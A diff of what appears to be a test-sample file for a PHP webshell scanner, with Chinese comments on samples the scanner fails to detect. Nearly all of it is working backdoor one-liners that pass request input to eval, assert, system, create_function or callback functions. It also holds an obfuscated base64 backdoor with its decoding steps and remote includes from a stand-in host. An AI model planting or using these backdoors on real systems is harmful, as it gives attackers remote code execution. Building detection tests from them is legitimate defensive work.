@@ -1,41 +1,41 @@
-<?php
-//cvi-360001
-eval($_POST['C']);
+
 
 //cvi-360002
-$a="ss";
-include("sss.jpg");
+include "sss.jpg";
+include("sss_tmp");
+require_once "http://www.test.com/sss.php";
 
-//cvi-360003
-echo '###m7lrvok###';$a=$_POST['m7lrv'];$b;$b=$a;@eval($a);
+//扫不出来....
+$a="http://www.test.com/sss.php";
+require_once $a;
+
+/////////////
 
 //cvi-360004
 $string = 'AABBCCDDEE';
 preg_replace($_POST['A'], $_POST['B'], $string);
 
-
 $user =$_GET['user'];preg_replace(chr(101),exec('whoami'),"aaaa");
 
 $b4dboy = $_POST['b4dboy']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($b4dboy)', 'add';
 
-
 //cvi-360006   换行就挂
 $b = $_POST['B'];  preg_replace($_POST['A'], $b, $string);
 
+/////////////
+
 //cvi-360007
-array_map("ass\x65rt",(array)$_REQUEST['expdoor']);
+$func = new ReflectionFunction($_GET[m]);
+echo $func->invokeArgs(array($_GET[c],$_GET[id]));
+
+
 
 //cvi-360008
 
 //cvi-360009
-$e = $_REQUEST['e'];
-$arr = array($_POST['pass'],);
-array_filter($arr, base64_decode($e));
+$e = $_REQUEST['e'];$arr = array($_POST['pass'],);array_filter($arr, base64_decode($e));
 
-//cvi-360010  换行就挂
-$e = $_REQUEST['e'];
-$arr = array($_POST['pass'],);
-array_filter($arr, base64_decode($e));
+$ee = "eval()";array_filter($a, base64_decode($ee));
 
 //cvi-360011  换行就挂
 $newfunc = create_function(null,'assert($cmd);');$newfunc();
@@ -48,7 +48,8 @@ $newfunc("$_POST['c']");
 $fun = $_POST['fun'];$ newfunc = create_function('str',$fun);
 
 //cvi-360014  换行就挂的那种
-$a=$_GET['A'];$a($_GET['B']);
+$a="eval(";$a($_GET['a']);
+
 
 //cvi-360015
 if ($dbhandle = sqlite_open('mysqlitedb', 0666, $sqliteerror)) {
@@ -58,70 +59,95 @@ if ($dbhandle = sqlite_open('mysqlitedb', 0666, $sqliteerror)) {
     exit;
 }
 
+
 //cvi-360016
-$string = "hello cobra";
-filter_var($string, FILTER_CALLBACK,eval($cmd));
-
+filter_var_array(array('test' => $_REQUEST['pass']), array('test' => array('filter' => FILTER_CALLBACK, 'options' => 'assert')));
 //cvi-360017 换行挂
-$string = "hello cobra";
-$func=$_POST['func'];filter_var($string, FILTER_CALLBACK,$func);
+$op=array('options' => 'assert');
+filter_var($_REQUEST['pass'], FILTER_CALLBACK, $op);
 
-//cvi-360018???????
-$data = mb_ereg_replace("[^A-Za-z0-9\.\-]","$_POST['replacement']",$data);
-
-
-//cvi-360019???????
-$replacement=$_POST['replacement'];$data = mb_ereg_replace("[^A-Za-z0-9\.\-]",$replacement,$data);
+//cvi-360018 一句话
+mb_ereg_replace('.*', $_REQUEST['op'], '', 'e');
+//cvi-360019 换行挂
+$e = "\ise";
+$data = mb_ereg_replace("/[^A-Za-z0-9\.\-]/","",$data,$e);
 
 
 //cvi-360020
 array_walk($array,$_POST['func']);
 
 //cvi-360021  换行挂
-$func=$_POST['func'];array_walk($array,$func);
+
 
 //cvi-360022
-eval(file_get_contents("php://input"))
+ini_set('allow_url_include, 1'); // Allow url inclusion in this script
+include('php://input');
 
 //cvi-360023   特征值
 GIF87a<?php
 BM<?php
 
-//cvi-360024
+//cvi-360024 这什么玩意
 $f=$c('',$d);$f();
 
-//cvi-360025
-$a=str_replace($bb=$cc);$a();$bb();
-$a=str_replace("$cc=$dd","Shanghai","Hello world!");$a();$cc();
+//cvi-360025  mdzz匹配不上
+$k = str_replace("8","","a8s88s8e8r88t");$k($_POST["8"]);
 
-//cvi-360026
-ob_start("eval($cmd)");
+
+$mt="mFsKCleRfU";
+$ojj="IEBleldle";
+$hsa="E9TVFsnd2VuJ10p";
+$fnx="Ow==";
+$zk = str_replace("d","","sdtdrd_redpdldadcde");
+$ef = $zk("z", "", "zbazsze64_zdzeczodze");
+$dva = $zk("p","","pcprpepaptpe_fpupnpcptpipopn");
+$zvm = $dva('', $ef($zk("le", "", $ojj.$mt.$hsa.$fnx)));
+//分解步骤
+//$zvm=create_function(base64_decode(str_replace("le","","IEBleldlemFsKCleRfUE9TVFsnd2VuJ10pOw==")))  //拼接后的语句
+//$zvm=create_function(base64_decode(IEBldmFsKCRfUE9TVFsnd2VuJ10pOw==)))   //执行完str_replace函数后，返回base64加密后的字符串
+//$zvm=create_function(@eval($_POST['wen']));   //执行完base64_decode 得到解密后的字符串 得到一句话木马 密码是wen
+$zvm();  //执行
+
+
+//cvi-360026  这个怎么用啊
+$cb= 'system';
+ob_start($cb);
+echo $_GET[c];
+ob_end_flush();
+
+$evalstr="";
+ob_start(function ($c,$d){global $evalstr;$evalstr=$c;});
+echo $_REQUEST['pass'];
+ob_end_flush();
+assert($evalstr);
+
+ob_start(function ($c,$d){register_shutdown_function('assert',$c);});
+echo $_REQUEST['pass'];
+ob_end_flush();
+
 
 //cvi-360027
-eval(php://input);
+//找不到栗子
 
-//cvi-360028    特征值
-eval("?>".
-cat /etc/passwd
+//cvi-360028  一句话
+eval(base64_decode(ZXZhbChiYXNlNjRfZGVjb2RlKFpYWmhiQ2hpWVhObE5qUmZaR1ZqYjJSbEtFeDVPRGhRTTBKdlkwRndiR1J0Um5OTFExSm1WVVU1VkZaR2RHdGlNamw1V0ZOclMweDVPQzVqYUhJb05EY3BMbEJuS1NrNykpOw));
+eval(gzinflate(base64_decode('s7ezsS/IKFBwSC1LzNFQiQ/wDw6JVlcpL9a1CyrNU4/VtE7OyM1PUQBKBbsGhbkGRSsFOwd5BoTEu3n6uPo5+roqxeoYmJiYaFrbA40CAA==')));
 
-//cvi-360029     特征值
-$bind_pl="IyEvdXNyL2Jpbi9lbnYgcGV";
 
-//cvi-360030      特征值
-$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU2
+//cvi-360034 一句话
+$_POST['sa']($_POST['sb']);
+$_POST['sa']($_POST['sb'],$_POST['sc']);
 
-//cvi-360031     特征值
-if(file_exists($settings['STOPFILE'])){$a="hello"}
+$sa = $_POST['sa'];
+$sa($_POST['sb']);
 
-//cvi-360032     特征值
-b374k;
-c999shexit();
+$sa = $_POST['sa'];
+$sb = $_POST['sb'];
+$sa($sb);
 
-//cvi-360033     特征值
-$OOO000000=urldecode;
-1MSSYowqjzlVVAwAoHHFXzQ5Lc;
+$sa = $_POST['sa'];
+$_POST($sa );
 
-//cvi-360034 360014
-$a=$_GET['A']; $a($_GET['B']);
+
 ?>
 
